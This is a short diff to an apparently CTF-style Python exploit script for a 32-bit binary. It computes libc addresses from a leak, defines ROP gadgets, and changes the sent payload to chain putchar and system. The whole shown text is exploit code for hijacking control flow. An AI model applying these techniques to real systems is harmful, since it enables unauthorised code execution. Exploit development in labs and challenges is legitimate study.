@@ -86,8 +86,9 @@ print(f"libc addr: {hex(libc_addr)}") # receive until newline
 libc.address = libc_addr
 system_addr = libc.symbols["system"]
 execve_addr = libc.symbols["execve"]
+putchar_addr = libc.symbols["putchar"]
 print(f"system_addr: {str(hex(system_addr))}")
-print(f"execve: {str(hex(execve_addr))}")
+print(f"putchar: {str(hex(putchar_addr))}")
 #pasted
 
 target = libc_addr + 0x001134d9 # add to esp
@@ -99,7 +100,8 @@ heap_arbitrary_addr = 0x804b0a7
 #payload +=b"BBBB"
 heap_rop_nop = libc_addr + 0x0000c30c
 print(f"heap nop rop : {hex(heap_rop_nop)}")
-payload =my_rop
+#payload =my_rop
+payload = p32(putchar_addr)
 heap_rop_push_edx = libc_addr + 0x0013cfd8
 payload += p32(system_addr)
 conn.sendline(payload)
